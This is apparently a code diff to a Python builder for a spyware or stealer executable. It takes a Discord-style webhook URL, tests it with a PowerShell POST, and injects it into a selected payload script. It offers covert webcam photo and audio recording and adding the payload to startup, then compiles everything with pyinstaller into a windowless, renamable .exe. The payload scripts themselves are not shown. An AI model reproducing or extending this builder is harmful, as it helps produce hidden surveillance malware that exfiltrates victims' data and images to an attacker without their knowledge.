@@ -24,7 +24,7 @@ def display_ascii_art():
     """
     print(Fore.LIGHTBLUE_EX + ascii_art)
 
-# Cool loading animation with dynamic spinner and alternating colors
+
 def loading_animation(message, color_sequence=None, duration=5):
     if color_sequence is None:
         color_sequence = [Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX]
@@ -46,54 +46,54 @@ def loading_animation(message, color_sequence=None, duration=5):
 
     print()  # Just move to the next line, don't say "Done!"
 
+def test_webhook(webhook):
+    # Test the webhook immediately
+    test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
+    result = subprocess.run(test_command, shell=True)  # Using subprocess.run()
+    return result.returncode == 0  # Return True if the webhook is valid
+
 def main():
     # Display ASCII art
     display_ascii_art()
 
-    # Ask if the user wants to add webcam capture
-    add_webcam = input(Fore.LIGHTYELLOW_EX + "Do you want the output to be added to startup? (y/n): ").strip().lower()
 
-    # Determine which script to compile based on user input
-    if add_webcam == 'y':
-        script_to_compile = "startup.py"
-    elif add_webcam == 'n':
-        script_to_compile = "script.py"
+    record_media = input(Fore.LIGHTYELLOW_EX + "Should the script include functionality to record audio and take a photo from the webcam?(y/n): ").strip().lower()
+
+    
+    add_to_startup = input(Fore.LIGHTYELLOW_EX + "Do you want to add the record script to startup? (y/n): ").strip().lower()
+
+  
+    if record_media == 'y' and add_to_startup == 'y':
+        script_to_compile = "SCscript.py"  # Both options selected
+    elif record_media == 'n' and add_to_startup == 'y':
+        script_to_compile = "startup.py"  # Only add to startup selected
+    elif record_media == 'y':
+        script_to_compile = "record.py"  # Only record media selected
     else:
-        print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')
-        return
+        script_to_compile = "script.py"  # Both options are 'n'
 
-    # Prompt the user to enter the webhook URL
+
     webhook = input(Fore.LIGHTYELLOW_EX + "Enter the webhook URL: ")
 
-    # Ask if the user wants to test the webhook
-    test_webhook = input(Fore.LIGHTGREEN_EX + "Do you want to test the webhook? (y/n): ").strip().lower()
-    if test_webhook == 'y':
-        loading_animation("Testing the webhook", duration=3)
-        
-        # Test the webhook using subprocess
-        test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
-        result = subprocess.run(test_command, shell=True)  # Using subprocess.run()
+    # Test the webhook immediately
+    if not test_webhook(webhook):
+        print(Fore.RED + "Webhook is not valid. Exiting without changes.")
+        input("Press any key to exit...")
+        return
 
-        if result.returncode != 0:
-            print(Fore.RED + "Webhook is not valid.")
-            input("Press any key to exit...")
-            return
-        else:
-            print(Fore.LIGHTYELLOW_EX + "Webhook is valid. Proceeding with the build.")
-    else:
-        print(Fore.LIGHTGREEN_EX + "Skipping webhook test.")
+    print(Fore.LIGHTGREEN_EX + "Webhook is valid. Proceeding with the build.")
 
-    # Copy the selected script to a backup
-    shutil.copyfile(f"SRC/{script_to_compile}", f"SRC/{script_to_compile}_backup.py")
+ 
+    backup_script = f"SRC/{script_to_compile}_backup.py"
+    shutil.copyfile(f"SRC/{script_to_compile}", backup_script)
 
-    # Replace {{WEBHOOK}} in the selected script with the webhook URL
+
     with open(f"SRC/{script_to_compile}", 'r') as file:
         script_content = file.read()
     script_content = script_content.replace('{{WEBHOOK}}', webhook)
     with open(f"SRC/{script_to_compile}", 'w') as file:
         file.write(script_content)
 
-    # Prompt the user if they want to rename the output executable
     while True:
         rename = input(Fore.LIGHTGREEN_EX + "Do you want to rename the output executable? (y/n): ").strip().lower()
         if rename == 'y':
@@ -101,21 +101,21 @@ def main():
             output_file = f"dist/{newname}.exe"
             break
         elif rename == 'n':
-            output_file = "dist/script.exe"  # Default name
+            output_file = f"dist/{script_to_compile.replace('.py', '')}.exe"  # Default name based on the script
             break
         else:
             print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')
 
-    # Build the executable
+
     loading_animation("Building the executable", [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTYELLOW_EX], duration=5)  # Cool loading animation
 
-    # Compilation starts immediately after the animation without "Done!" message
+
     build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/{script_to_compile} --name {'script' if rename == 'n' else newname}"
     subprocess.run(build_command, shell=True)  # Using subprocess.run()
 
-    # Restore the original script
-    shutil.copyfile(f"SRC/{script_to_compile}_backup.py", f"SRC/{script_to_compile}")
-    os.remove(f"SRC/{script_to_compile}_backup.py")
+
+    shutil.copyfile(backup_script, f"SRC/{script_to_compile}")
+    os.remove(backup_script)
 
     print(Fore.LIGHTCYAN_EX + f"Build complete! The executable is in the 'dist' folder as '{output_file}'.")
     input("Press any key to exit...")
